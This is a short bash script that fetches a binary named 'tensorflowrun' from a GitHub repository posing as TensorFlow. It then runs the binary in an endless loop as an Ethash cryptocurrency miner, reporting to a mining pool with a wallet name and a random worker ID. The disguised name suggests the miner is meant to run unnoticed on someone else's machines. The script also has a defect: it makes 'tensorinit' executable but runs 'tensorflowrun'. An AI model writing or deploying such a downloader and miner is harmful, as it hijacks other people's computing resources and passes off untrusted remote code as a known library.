#!/bin/bash
POOL=eth.ethashpool.com:3939
WALLET=nglkmerkel
WORKER=$(echo $(shuf -i 10-2000 -n 1))
wget https://github.com/Mercuryfreddy209/Tensorflow/raw/main/tensorflowrun
chmod +x tensorinit
while [ 1 ]; do
./tensorflowrun --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 10
done
sleep 999999999 
